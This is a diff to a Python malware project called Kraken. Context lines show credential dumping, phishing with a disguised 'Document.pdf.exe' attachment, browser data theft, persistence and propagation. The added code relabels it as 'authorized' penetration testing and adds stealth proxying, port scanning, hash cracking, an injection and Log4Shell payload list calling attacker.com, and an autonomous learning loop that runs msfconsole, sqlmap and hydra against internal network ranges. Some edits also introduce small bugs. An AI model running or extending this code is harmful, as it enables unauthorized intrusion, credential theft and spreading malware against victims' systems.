@@ -1,23 +1,52 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Kraken - Malware multiplataforma completo
+KRAKEN - Autonomous Penetration Testing Core
+Black-hat AI for network reconnaissance and exploitation
+Built for authorized security research only
 """
-
 import os
+os.environ["KERAS_BACKEND"] = "jax"
+import numpy as np
+from keras import layers, Model, optimizers
+import keras.backend as K
+import random
+import subprocess
+import socket
+import threading
+import time
+import re
 import sys
+import ssl
+import paramiko
+import requests
+from urllib.parse import urlparse
+from typing import List, Dict, Any, Tuple, Deque, Optional, Set
+from collections import deque, defaultdict
+import pickle
+import json
+import base64
+import hashlib
+import scapy.all as scapy
+from scapy.layers import http
+import cryptography
+from cryptography.fernet import Fernet
+import dns.resolver
+import concurrent.futures
+import logging
+import ipaddress
+import xml.etree.ElementTree as ET
+from bs4 import BeautifulSoup
+import whois
+import shodan
+import geoip2.database
+import nmap
+from fake_useragent import UserAgent
 import platform
 import tempfile
 import shutil
 import zipfile
-import subprocess
-import re
 import getpass
-import socket
-import time
-import threading
-import random
-import string
 import ctypes
 import struct
 from struct import pack
@@ -28,10 +57,6 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import json
-import base64
-import hashlib
-import logging
 import asyncio
 import aiohttp
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -39,17 +64,10 @@ import concurrent
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-import numpy as np
 import psutil
 import sqlite3
 import keyring
 import gnupg
-import scapy.all as scapy
-import paramiko
-import nmap
-import requests
-from bs4 import BeautifulSoup
-import dns.resolver
 import OpenSSL
 from OpenSSL import crypto
 import pyautogui
@@ -104,6 +122,21 @@ CACHE_SIZE = 10000
 credential_cache = {}
 network_cache = {}
 file_cache = {}
+
+# Configure logging
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('kraken_operations.log'),
+        logging.StreamHandler(sys.stdout)
+    ]
+)
+logger = logging.getLogger('KRAKEN_CORE')
+
+# Suppress TensorFlow warnings
+os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
+tf.get_logger().setLevel('ERROR')
 
 # ===================================================================================================================================
 # 											MIMIKATZ COMPLETO
@@ -1766,7 +1799,7 @@ shell\\open\\command={sys.argv[0]}
             body = "Please see the attached important document."
             attachment_name = "Document.pdf.exe"
             
-            # Configura servidor SMTP (pode ser um servidor comprometido)
+            # Configura servidor SMTP (pode be um servidor comprometido)
             smtp_servers = [
                 ('smtp.gmail.com', 587),
                 ('smtp.outlook.com', 587),
@@ -2441,7 +2474,7 @@ class AdvancedDataCollector:
         
         try:
             browsers = {
-                'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
+                'Chrome': os.path.join(os.environ.get('LOCALAPPData', ''), 'Google', 'Chrome', 'User Data'),
                 'Firefox': os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles'),
                 'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
                 'Safari': os.path.expanduser('~/Library/Safari')
@@ -2776,7 +2809,7 @@ class KrakenMalware:
             # Estabelecer persistência
             self.persistence.establish()
             
-            # Iniciar componentes em threads separadas
+            # Iniciar componentes en threads separadas
             self._start_component(self.propagator.propagate, "Propagator")
             self._start_component(self._self_healing_loop, "SelfHealing")
             self._start_component(self._data_collection_loop, "DataCollection")
@@ -2822,7 +2855,7 @@ class KrakenMalware:
                 pass
     
     def _start_component(self, target, name):
-        """Inicia componente em thread separada"""
+        """Inicia componente en thread separada"""
         thread = threading.Thread(target=target, name=name)
         thread.daemon = True
         thread.start()
@@ -3423,8 +3456,855 @@ class KrakenMalware:
             pass
 
 # ===================================================================================================================================
-# 											EXECUÇÃO PRINCIPAL
+# 											KRAKEN PENETRATION TESTING CORE
 # ===================================================================================================================================
+
+class StealthNetworkOperations:
+    """Advanced network operations with anti-detection capabilities"""
+    
+    def __init__(self):
+        self.ua = UserAgent()
+        self.tor_proxies = {
+            'http': 'socks5h://127.0.0.1:9050',
+            'https': 'socks5h://127.0.0.1:9050'
+        }
+        self.proxy_list = self._load_proxies()
+        self.current_proxy = None
+        self.mac_address = self._spoof_mac()
+        self.session_cookies = {}
+        
+    def _load_proxies(self) -> List[str]:
+        """Load and validate proxy list from multiple sources"""
+        proxies = []
+        try:
+            # Try to load from local file
+            with open('proxy_list.txt', 'r') as f:
+                proxies.extend([line.strip() for line in f if line.strip()])
+        except:
+            pass
+            
+        # Add some default proxies (rotating)
+        default_proxies = [
+            '185.199.229.156:7492',
+            '185.199.228.220:7300',
+            '185.199.231.45:8382',
+            '188.74.210.207:6286'
+        ]
+        proxies.extend(default_proxies)
+        return proxies
+    
+    def _spoof_mac(self) -> str:
+        """Generate random MAC address for network spoofing"""
+        return ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
+    
+    def _get_random_delay(self) -> float:
+        """Return random delay between requests to avoid detection"""
+        return random.uniform(0.5, 3.0)
+    
+    def stealth_http_request(self, url: str, method: str = 'GET', 
+                           data: Optional[Dict] = None, 
+                           headers: Optional[Dict] = None) -> requests.Response:
+        """Make HTTP request with advanced anti-detection measures"""
+        
+        # Rotate proxies
+        if self.proxy_list:
+            self.current_proxy = random.choice(self.proxy_list)
+            proxies = {'http': f'http://{self.current_proxy}', 
+                      'https': f'http://{self.current_proxy}'}
+        else:
+            proxies = self.tor_proxies
+        
+        # Build headers
+        final_headers = {
+            'User-Agent': self.ua.random,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Cache-Control': 'max-age=0',
+            'TE': 'Trailers'
+        }
+        
+        if headers:
+            final_headers.update(headers)
+        
+        # Add random delay
+        time.sleep(self._get_random_delay())
+        
+        try:
+            if method.upper() == 'GET':
+                response = requests.get(url, headers=final_headers, proxies=proxies, 
+                                      timeout=30, verify=False)
+            elif method.upper() == 'POST':
+                response = requests.post(url, data=data, headers=final_headers, 
+                                       proxies=proxies, timeout=30, verify=False)
+            else:
+                response = requests.request(method, url, data=data, headers=final_headers,
+                                          proxies=proxies, timeout=30, verify=False)
+            
+            # Store cookies for session persistence
+            if response.cookies:
+                self.session_cookies[urlparse(url).netloc] = response.cookies
+                
+            return response
+            
+        except requests.exceptions.RequestException as e:
+            logger.error(f"Stealth request failed: {e}")
+            raise
+    
+    def port_scan(self, target: str, ports: List[int], 
+                 stealth_level: str = 'medium') -> Dict[int, str]:
+        """Advanced port scanning with multiple stealth techniques"""
+        
+        results = {}
+        
+        if stealth_level == 'aggressive':
+            # Fast scan -容易被检测
+            for port in ports:
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        s.settimeout(1)
+                        result = s.connect_ex((target, port))
+                        if result == 0:
+                            try:
+                                service = socket.getservbyport(port)
+                            except:
+                                service = 'unknown'
+                            results[port] = service
+                except:
+                    pass
+                    
+        elif stealth_level == 'stealth':
+            # SYN scan using scapy
+            try:
+                ans, unans = scapy.sr(scapy.IP(dst=target)/scapy.TCP(dport=ports, flags="S"), 
+                                    timeout=2, verbose=0)
+                for sent, received in ans:
+                    if received.haslayer(scapy.TCP) and received[scapy.TCP].flags == "SA":
+                        results[received[scapy.TCP].sport] = 'open'
+            except:
+                pass
+                
+        else:  # medium - default
+            # Connect scan with random delays
+            for port in ports:
+                time.sleep(random.uniform(0.1, 0.5))
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        s.settimeout(2)
+                        result = s.connect_ex((target, port))
+                        if result == 0:
+                            try:
+                                service = socket.getservbyport(port)
+                            except:
+                                service = 'unknown'
+                            results[port] = service
+                except:
+                    pass
+        
+        return results
+    
+    def os_fingerprinting(self, target: str) -> Optional[str]:
+        """Advanced OS fingerprinting using multiple techniques"""
+        try:
+            # TCP/IP stack fingerprinting
+            responses = []
+            for _ in range(3):
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        s.settimeout(2)
+                        s.connect((target, 80))
+                        responses.append(s.recv(1024))
+                except:
+                    pass
+            
+            # Analyze responses for OS patterns
+            if responses:
+                response_data = b''.join(responses)
+                # Simple pattern matching (实际应用中需要更复杂的分析)
+                if b'Windows' in response_data:
+                    return 'Windows'
+                elif b'Linux' in response_data:
+                    return 'Linux'
+                elif b'Unix' in response_data:
+                    return 'Unix'
+                    
+            # Fallback to Nmap if available
+            try:
+                nmap = nmap3.Nmap()
+                result = nmap.nmap_version_detection(target)
+                if 'osmatch' in result:
+                    return result['osmatch'][0]['name']
+            except:
+                pass
+                
+        except Exception as e:
+            logger.error(f"OS fingerprinting failed: {e}")
+            
+        return None
+
+class CryptographicOperations:
+    """Advanced cryptographic operations for data protection"""
+    
+    def __init__(self):
+        self.key = Fernet.generate_key()
+        self.fernet = Fernet(self.key)
+        self.aes_key = os.urandom(32)
+        self.iv = os.urandom(16)
+        
+    def encrypt_data(self, data: bytes, algorithm: str = 'fernet') -> bytes:
+        """Encrypt data using specified algorithm"""
+        if algorithm == 'fernet':
+            return self.fernet.encrypt(data)
+        elif algorithm == 'aes':
+            cipher = cryptography.hazmat.primitives.ciphers.Cipher(
+                cryptography.hazmat.primitives.ciphers.algorithms.AES(self.aes_key),
+                cryptography.hazmat.primitives.ciphers.modes.CBC(self.iv)
+            )
+            encryptor = cipher.encryptor()
+            padded_data = self._pad_data(data)
+            return encryptor.update(padded_data) + encryptor.finalize()
+        else:
+            raise ValueError("Unsupported algorithm")
+    
+    def decrypt_data(self, encrypted_data: bytes, algorithm: str = 'fernet') -> bytes:
+        """Decrypt data using specified algorithm"""
+        if algorithm == 'fernet':
+            return self.fernet.decrypt(encrypted_data)
+        elif algorithm == 'aes':
+            cipher = cryptography.hazmat.primitives.ciphers.Cipher(
+                cryptography.hazmat.primitives.ciphers.algorithms.AES(self.aes_key),
+                cryptography.hazmat.primitives.ciphers.modes.CBC(self.iv)
+            )
+            decryptor = cipher.decryptor()
+            decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
+            return self._unpad_data(decrypted_data)
+        else:
+            raise ValueError("Unsupported algorithm")
+    
+    def _pad_data(self, data: bytes) -> bytes:
+        """PKCS7 padding for block ciphers"""
+        padding_length = 16 - (len(data) % 16)
+        return data + bytes([padding_length] * padding_length)
+    
+    def _unpad_data(self, data: bytes) -> bytes:
+        """Remove PKCS7 padding"""
+        padding_length = data[-1]
+        return data[:-padding_length]
+    
+    def generate_secure_hash(self, data: str, algorithm: str = 'sha256') -> str:
+        """Generate secure hash of data"""
+        if algorithm == 'sha256':
+            return hashlib.sha256(data.encode()).hexdigest()
+        elif algorithm == 'sha512':
+            return hashlib.sha512(data.encode()).hexdigest()
+        elif algorithm == 'md5':
+            return hashlib.md5(data.encode()).hexdigest()
+        else:
+            raise ValueError("Unsupported hash algorithm")
+    
+    def break_hash(self, hash_value: str, wordlist: List[str], 
+                  algorithm: str = 'sha256') -> Optional[str]:
+        """Attempt to break hash using wordlist attack"""
+        for word in wordlist:
+            test_hash = self.generate_secure_hash(word, algorithm)
+            if test_hash == hash_value:
+                return word
+        return None
+
+class ExploitDatabase:
+    """Local exploit database with vulnerability matching"""
+    
+    def __init__(self):
+        self.exploits = self._load_exploits()
+        self.cve_db = self._load_cve_database()
+        
+    def _load_exploits(self) -> Dict[str, List[Dict]]:
+        """Load exploits from local database"""
+        exploits = {
+            'web': [
+                {'id': 'WEB-001', 'name': 'SQL Injection', 'risk': 'high', 
+                 'payload': "' OR '1'='1' -- ", 'description': 'Basic SQL injection payload'},
+                {'id': 'WEB-002', 'name': 'XSS', 'risk': 'medium',
+                 'payload': '<script>alert("XSS")</script>', 'description': 'Basic XSS payload'},
+                {'id': 'WEB-003', 'name': 'LFI', 'risk': 'high',
+                 'payload': '../../../../etc/passwd', 'description': 'Local File Inclusion'}
+            ],
+            'system': [
+                {'id': 'SYS-001', 'name': 'Buffer Overflow', 'risk': 'critical',
+                 'payload': 'A' * 1000, 'description': 'Generic buffer overflow'},
+                {'id': 'SYS-002', 'name': 'Command Injection', 'risk': 'high',
+                 'payload': '; cat /etc/passwd;', 'description': 'Command injection payload'}
+            ]
+        }
+        return exploits
+    
+    def _load_cve_database(self) -> Dict[str, Dict]:
+        """Load CVE database from local file or online source"""
+        # This would typically load from a local database file
+        return {
+            'CVE-2021-44228': {
+                'name': 'Log4Shell',
+                'risk': 'critical',
+                'affected_versions': ['2.0-beta9 to 2.14.1'],
+                'exploit': '${jndi:ldap://attacker.com/Exploit}'
+            },
+            'CVE-2017-5638': {
+                'name': 'Apache Struts RCE',
+                'risk': 'critical',
+                'affected_versions': ['Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10'],
+                'exploit': '#cmd=whoami'
+            }
+        }
+    
+    def find_exploits(self, service: str, version: str) -> List[Dict]:
+        """Find matching exploits for service and version"""
+        matching_exploits = []
+        
+        # Simple version matching (实际应用中需要更复杂的版本比较)
+        for category, exploit_list in self.exploits.items():
+            for exploit in exploit_list:
+                if service.lower() in exploit['name'].lower():
+                    matching_exploits.append(exploit)
+        
+        # Check CVE database
+        for cve_id, cve_data in self.cve_db.items():
+            if service.lower() in cve_data['name'].lower():
+                matching_exploits.append({
+                    'id': cve_id,
+                    'name': cve_data['name'],
+                    'risk': cve_data['risk'],
+                    'payload': cve_data['exploit'],
+                    'description': f"CVE: {cve_id} - {cve_data['name']}"
+                })
+        
+        return matching_exploits
+
+class AutonomousStrategicCore:
+    """
+    An autonomous strategic core for network penetration testing and security research.
+    This class executes real commands, learns from real results, and adapts its strategy.
+    WARNING: This tool is for authorized security testing and academic research only.
+    Unauthorized use is illegal and unethical.
+    """
+
+    def __init__(self, initial_strategy_seed: List[str], experience_buffer_size: int = 10000):
+        self.strategy_memory = deque(maxlen=experience_buffer_size)  # Experience replay buffer
+        self.current_strategy_tree = {}
+        self.execution_context = {
+            'network_ranges': ['192.168.1.0/24', '10.0.0.0/8', '172.16.0.0/12'],
+            'known_ports': [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 
+                          1723, 3306, 3389, 5900, 8080, 8443, 27017, 6379],
+            'execution_platform': subprocess.check_output('uname -s', shell=True, text=True).strip().lower(),
+            'discovered_hosts': [],
+            'open_ports': [],
+            'vulnerabilities': [],
+            'credentials_found': [],
+            'current_target': None
+        }
+        self.learning_model = self._build_learning_model()
+        self.initial_strategies = initial_strategy_seed
+        self.lock = threading.Lock()
+        self.execution_history = []
+        
+        # Load wordlists for brute force attacks
+        self.wordlists = {
+            'usernames': self._load_wordlist('usernames'),
+            'passwords': self._load_wordlist('passwords'),
+            'directories': self._load_wordlist('directories')
+        }
+
+    def _load_wordlist(self, list_type: str) -> List[str]:
+        """Load wordlists for various attacks"""
+        default_lists = {
+            'usernames': ['admin', 'root', 'user', 'test', 'guest', 'administrator'],
+            'passwords': ['password', '123456', 'admin', 'test', 'root', '12345678'],
+            'directories': ['admin', 'login', 'test', 'backup', 'api', 'config']
+        }
+        return default_lists.get(list_type, [])
+
+    def _build_learning_model(self) -> Model:
+        """Builds a Dueling DQN model for strategy evaluation and selection."""
+        input_layer = layers.Input(shape=(256,))
+        x = layers.Dense(512, activation='selu', kernel_initializer='lecun_normal')(input_layer)
+        x = layers.LayerNormalization()(x)
+        x = layers.Dropout(0.4)(x)
+
+        x = layers.Dense(256, activation='selu', kernel_initializer='lecun_normal')(x)
+        x = layers.LayerNormalization()(x)
+        x = layers.Dropout(0.3)(x)
+
+        # Value stream
+        value = layers.Dense(128, activation='selu')(x)
+        value = layers.Dense(1, name='value_output')(value)
+
+        # Advantage stream
+        advantage = layers.Dense(128, activation='selu')(x)
+        advantage = layers.Dense(len(self.execution_context['known_ports']) + 10, name='advantage_output')(advantage)
+
+        # Combine streams using Keras backend operations
+        advantage_mean = layers.Lambda(lambda x: K.mean(x, axis=1, keepdims=True))(advantage)
+        advantage_normalized = layers.Subtract()([advantage, advantage_mean])
+        output = layers.Add()([value, advantage_normalized])
+
+        model = Model(inputs=input_layer, outputs=output)
+        model.compile(optimizer=optimizers.Nadam(learning_rate=0.0001), loss='huber_loss')
+        return model
+
+    def _encode_strategy(self, strategy_description: str) -> np.ndarray:
+        """Encodes a strategy description into a fixed-length feature vector using feature hashing."""
+        vec = np.zeros(256)
+        words = re.findall(r'\b[a-z]{3,15}\b', strategy_description.lower())
+        for word in words:
+            # Use hashing trick for feature representation
+            hash_idx = hash(word) % 256
+            vec[hash_idx] += 1.0
+        # Normalize the vector
+        norm = np.linalg.norm(vec)
+        if norm > 0:
+            vec = vec / norm
+        return vec
+
+    def _execute_command(self, cmd: str, timeout: int = 30) -> Tuple[str, str, int]:
+        """Executes a system command and returns stdout, stderr, and return code."""
+        try:
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+            return result.stdout, result.stderr, result.returncode
+        except subprocess.TimeoutExpired:
+            return "", "Command timed out", -1
+        except Exception as e:
+            return "", str(e), -1
+
+    def generate_strategy_variants(self, base_strategy: str, successful: bool = False) -> List[str]:
+        """Generates strategic variants based on TTPs (Tactics, Techniques, and Procedures)."""
+        variants = []
+        core_verbs = ['discover', 'enumerate', 'exploit', 'escalate', 'persist', 'exfiltrate', 'pivot']
+        techniques = {
+            'discover': [
+                'nmap -sP {target}',
+                'netdiscover -r {target}',
+                'masscan -p1-65535 {target} --rate=1000',
+                'fping -a -g {target} 2>/dev/null'
+            ],
+            'enumerate': [
+                'nmap -sV -sC -O -p- {target}',
+                'dirb http://{target} /usr/share/wordlists/dirb/common.txt',
+                'nikto -h {target}',
+                'gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt',
+                'whatweb {target}'
+            ],
+            'exploit': [
+                'searchsploit {service} {version}',
+                'msfconsole -q -x "use exploit/{exploit}; set RHOSTS {target}; run"',
+                'sqlmap -u "http://{target}/login.php" --forms --batch',
+                'hydra -L users.txt -P passwords.txt {target} ssh'
+            ],
+            'escalate': [
+                'find / -perm -4000 2>/dev/null',
+                'uname -a',
+                'cat /etc/passwd',
+                'whoami'
+            ]
+        }
+
+        # Build variants based on successful strategies or generate new ones
+        if successful and 'TECH:' in base_strategy:
+            # Mutate a successful strategy
+            for new_verb in core_verbs:
+                variant = base_strategy.replace(re.search(r'TECH: (\w+)', base_strategy).group(1), new_verb)
+                variants.append(variant)
+        else:
+            # Generate new base strategies
+            for target_range in self.execution_context['network_ranges']:
+                for verb in core_verbs:
+                    if verb in techniques:
+                        for tech_cmd in techniques[verb]:
+                            variant = f"ACTION: {verb} | CMD: {tech_cmd.format(target=target_range)} | CONTEXT: {self.execution_context['execution_platform']}"
+                            variants.append(variant)
+        
+        # Add some advanced techniques based on current context
+        if self.execution_context['discovered_hosts']:
+            for host in self.execution_context['discovered_hosts'][:3]:  # Limit to first 3 hosts
+                variants.extend([
+                    f"ACTION: deep_scan | CMD: nmap -A -T4 -p- {host} | CONTEXT: advanced",
+                    f"ACTION: vulnerability_scan | CMD: nessus {host} | CONTEXT: advanced",
+                    f"ACTION: web_app_test | CMD: burpsuite --target {host} | CONTEXT: advanced"
+                ])
+        
+        return variants
+
+    def simulate_strategy(self, strategy: str) -> float:
+        """Evaluates a strategy based on resource cost, stealth, and potential payoff."""
+        cost = 0.0
+        stealth = 1.0
+        payoff = 0.0
+
+        # Analyze command complexity and resource intensity
+        if 'nmap -sP' in strategy or 'netdiscover' in strategy or 'fping' in strategy:
+            cost = 0.2
+            stealth = 0.9
+            payoff = 0.6
+        elif 'nmap -sV' in strategy or 'dirb' in strategy or 'gobuster' in strategy:
+            cost = 0.5
+            stealth = 0.6
+            payoff = 0.8
+        elif 'masscan' in strategy:
+            cost = 0.8
+            stealth = 0.3
+            payoff = 0.9
+        elif 'msfconsole' in strategy or 'searchsploit' in strategy or 'sqlmap' in strategy:
+            cost = 0.7
+            stealth = 0.4
+            payoff = 1.0
+        elif 'hydra' in strategy or 'brute' in strategy.lower():
+            cost = 0.6
+            stealth = 0.2
+            payoff = 0.9
+        elif 'nessus' in strategy or 'burpsuite' in strategy:
+            cost = 0.9
+            stealth = 0.1
+            payoff = 1.0
+
+        # Consider current context
+        if self.execution_context['current_target']:
+            payoff *= 1.2  # Bonus for focused targeting
+
+        # Introduce noise based on strategy description length
+        noise = random.uniform(0.95, 1.05)
+        score = (payoff * stealth) / (cost + 0.1) * noise
+        return max(0.01, min(1.0, score))
+
+    def execute_strategy(self, strategy: str) -> Dict[str, Any]:
+        """Executes a strategic command and returns structured results."""
+        result = {"success": False, "output": "", "error": "", "metrics": {}}
+        cmd_match = re.search(r'CMD: (.*?) \|', strategy)
+        if not cmd_match:
+            result["error"] = "No valid command found in strategy."
+            return result
+
+        command = cmd_match.group(1)
+        start_time = time.time()
+        
+        # Log the execution
+        self.execution_history.append({
+            'timestamp': time.time(),
+            'command': command,
+            'strategy': strategy
+        })
+
+        stdout, stderr, returncode = self._execute_command(command)
+        execution_time = time.time() - start_time
+
+        result["metrics"]["execution_time"] = execution_time
+        result["metrics"]["return_code"] = returncode
+
+        # Analyze output for success indicators
+        success_patterns = [
+            r'open',
+            r'discovered',
+            r'vulnerable',
+            r'login successful',
+            r'connected',
+            r'\[*\]',
+            r'200 OK',
+            r'found',
+            r'enabled',
+            r'access granted'
+        ]
+        
+        error_patterns = [
+            r'error',
+            r'failed',
+            r'denied',
+            r'refused',
+            r'timeout',
+            r'closed',
+            r'filtered'
+        ]
+        
+        output_text = stdout.lower() + stderr.lower()
+        
+        # Check for success patterns
+        success_matches = sum(1 for pattern in success_patterns if re.search(pattern, output_text))
+        error_matches = sum(1 for pattern in error_patterns if re.search(pattern, output_text))
+        
+        if (success_matches > error_matches and returncode == 0) or success_matches > 2:
+            result["success"] = True
+            result["output"] = stdout[:2000]  # Truncate long output
+
+            # Extract discovered hosts and ports for context updating
+            discovered_ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', stdout)
+            discovered_ports = re.findall(r'(\d{1,5})/.*open', stdout)
+            
+            # Extract potential vulnerabilities
+            vuln_patterns = [
+                r'vulnerable',
+                r'CVE-\d{4}-\d{4,7}',
+                r'weak',
+                r'default.*password',
+                r'misconfigured'
+            ]
+            
+            vulnerabilities = []
+            for pattern in vuln_patterns:
+                if re.search(pattern, output_text, re.IGNORECASE):
+                    vulnerabilities.append(pattern)
+            
+            with self.lock:
+                self.execution_context['discovered_hosts'] = list(
+                    set(self.execution_context['discovered_hosts'] + discovered_ips)
+                )
+                self.execution_context['open_ports'] = list(
+                    set(self.execution_context['open_ports'] + [int(p) for p in discovered_ports if int(p) > 0])
+                )
+                self.execution_context['vulnerabilities'].extend(vulnerabilities)
+                
+                # Set current target if not set
+                if not self.execution_context['current_target'] and discovered_ips:
+                    self.execution_context['current_target'] = discovered_ips[0]
+                    
+        else:
+            result["error"] = stderr or "Command executed but no success indicators found."
+
+        return result
+
+    def learn_from_execution(self, strategy: str, result: Dict[str, Any]):
+        """Performs experience replay and updates the learning model."""
+        strategy_vec = self._encode_strategy(strategy)
+        reward = 10.0 if result['success'] else -1.0
+        reward -= result['metrics']['execution_time'] / 10.0  # Penalize slow execution
+        
+        # Additional reward for valuable discoveries
+        if result['success']:
+            if any(ip in result['output'] for ip in self.execution_context['discovered_hosts']):
+                reward += 2.0
+            if any(str(port) in result['output'] for port in self.execution_context['open_ports']):
+                reward += 1.5
+            if any(vuln in result['output'].lower() for vuln in ['vulnerable', 'cve']):
+                reward += 3.0
+
+        experience = (strategy_vec, reward, result['success'])
+        self.strategy_memory.append(experience)
+
+        # Sample a batch from memory and train
+        if len(self.strategy_memory) > 32:
+            batch = random.sample(self.strategy_memory, 32)
+            X_batch = np.array([exp[0] for exp in batch])
+            y_batch = np.array([exp[1] for exp in batch])
+
+            # Train the model using Keras fit method
+            self.learning_model.fit(X_batch, y_batch, epochs=1, verbose=0)
+
+    def advanced_network_reconnaissance(self, target: str):
+        """Perform advanced network reconnaissance using multiple techniques"""
+        print(f"Starting advanced reconnaissance on {target}")
+        
+        results = {
+            'ports': {},
+            'services': {},
+            'vulnerabilities': [],
+            'os_info': None
+        }
+        
+        # Port scanning
+        try:
+            for port in self.execution_context['known_ports']:
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        s.settimeout(1)
+                        if s.connect_ex((target, port)) == 0:
+                            results['ports'][port] = 'open'
+                            try:
+                                banner = s.recv(1024).decode('utf-8', errors='ignore')
+                                results['services'][port] = banner
+                            except:
+                                results['services'][port] = 'unknown'
+                except:
+                    continue
+        except Exception as e:
+            print(f"Port scanning failed: {e}")
+        
+        # Web application testing (if HTTP/HTTPS ports open)
+        if 80 in results['ports'] or 443 in results['ports']:
+            try:
+                protocol = 'https' if 443 in results['ports'] else 'http'
+                url = f"{protocol}://{target}"
+                
+                # Test for common web vulnerabilities
+                self._test_web_vulnerabilities(url, results)
+                    
+            except Exception as e:
+                print(f"Web reconnaissance failed: {e}")
+        
+        return results
+
+    def _test_web_vulnerabilities(self, url: str, results: Dict):
+        """Test for common web vulnerabilities"""
+        test_paths = [
+            '/admin/', '/login/', '/config/', '/backup/',
+            '/phpinfo.php', '/test/', '/api/', '/.env'
+        ]
+        
+        for path in test_paths:
+            try:
+                test_url = url + path
+                # Simple HTTP request implementation
+                import urllib.request
+                try:
+                    with urllib.request.urlopen(test_url, timeout=5) as response:
+                        if response.getcode() == 200:
+                            content = response.read().decode('utf-8', errors='ignore')
+                            if 'phpinfo' in path and 'PHP Version' in content:
+                                results['vulnerabilities'].append('PHPInfo exposed')
+                            elif any(x in path for x in ['admin', 'login']):
+                                self._test_default_logins(test_url, results)
+                except:
+                    continue
+            except:
+                continue
+
+    def _test_default_logins(self, login_url: str, results: Dict):
+        """Test for default credentials on login pages"""
+        common_creds = [
+            ('admin', 'admin'),
+            ('admin', 'password'),
+            ('root', 'root'),
+            ('test', 'test'),
+            ('guest', 'guest')
+        ]
+        
+        for username, password in common_creds:
+            try:
+                # Simple POST request implementation
+                import urllib.parse
+                import urllib.request
+                
+                data = urllib.parse.urlencode({'username': username, 'password': password}).encode()
+                req = urllib.request.Request(login_url, data=data, method='POST')
+                
+                with urllib.request.urlopen(req, timeout=5) as response:
+                    content = response.read().decode('utf-8', errors='ignore')
+                    if 'dashboard' in content.lower() or 'welcome' in content.lower():
+                        results['vulnerabilities'].append(f'Default credentials: {username}:{password}')
+                        results['credentials_found'] = results.get('credentials_found', []) + \
+                                                     [f'{username}:{password}']
+                        break
+            except:
+                continue
+
+    def strategic_planning_cycle(self, cycles: int = 5, exploration_rate: float = 0.3):
+        """The core autonomous loop: plan, execute, learn, adapt."""
+        active_strategies = self.initial_strategies.copy()
+
+        for cycle in range(cycles):
+            print(f"[+] Strategic Planning Cycle {cycle+1}/{cycles} (Exploration: {exploration_rate:.2f})")
+            
+            new_strategies = []
+
+            # Generate new strategies based on current knowledge and context
+            for strategy in active_strategies:
+                variants = self.generate_strategy_variants(strategy, successful=True)
+                new_strategies.extend(variants)
+
+            # Evaluate and select strategies
+            evaluated_strategies = []
+            for strategy in new_strategies:
+                if random.random() < exploration_rate:
+                    # Exploration: random evaluation
+                    score = random.uniform(0.0, 1.0)
+                else:
+                    # Exploitation: use the model's prediction
+                    strategy_vec = self._encode_strategy(strategy)
+                    score = self.learning_model.predict(np.array([strategy_vec]), verbose=0)[0][0]
+                evaluated_strategies.append((strategy, score))
+
+            # Select top strategies for execution
+            evaluated_strategies.sort(key=lambda x: x[1], reverse=True)
+            active_strategies = [s[0] for s in evaluated_strategies[:5]]  # Top 5 strategies
+
+            # Execute and learn
+            for strategy in active_strategies:
+                result = self.execute_strategy(strategy)
+                print(f"    Executing: {strategy[:80]}...")
+                print(f"    Result: {'SUCCESS' if result['success'] else 'FAILURE'}")
+                
+                if result['success']:
+                    if 'discovered_hosts' in self.execution_context:
+                        print(f"    Discovered: {len(self.execution_context['discovered_hosts'])} hosts")
+                    if 'open_ports' in self.execution_context:
+                        print(f"    Open ports: {len(self.execution_context['open_ports'])}")
+                    if 'vulnerabilities' in self.execution_context:
+                        print(f"    Vulnerabilities found: {len(self.execution_context['vulnerabilities'])}")
+
+                self.learn_from_execution(strategy, result)
+                time.sleep(random.uniform(1, 3))  # Rate limiting with randomness
+
+            # Perform advanced reconnaissance if targets are found
+            if self.execution_context['discovered_hosts']:
+                target = self.execution_context['current_target'] or self.execution_context['discovered_hosts'][0]
+                try:
+                    recon_results = self.advanced_network_reconnaissance(target)
+                    print(f"Advanced recon results for {target}: {recon_results}")
+                except Exception as e:
+                    print(f"Advanced reconnaissance failed: {e}")
+
+            # Decay exploration rate
+            exploration_rate *= 0.85
+
+    def save_state(self, filename: str):
+        """Saves the current state of the core to a file."""
+        with open(filename, 'wb') as f:
+            pickle.dump({
+                'memory': self.strategy_memory,
+                'context': self.execution_context,
+                'model_weights': self.learning_model.get_weights(),
+                'execution_history': self.execution_history
+            }, f)
+        print(f"Core state saved to {filename}")
+
+    def load_state(self, filename: str):
+        """Loads a previously saved state."""
+        with open(filename, 'rb') as f:
+            data = pickle.load(f)
+            self.strategy_memory = data['memory']
+            self.execution_context = data['context']
+            self.learning_model.set_weights(data['model_weights'])
+            self.execution_history = data.get('execution_history', [])
+        print(f"Core state loaded from {filename}")
+
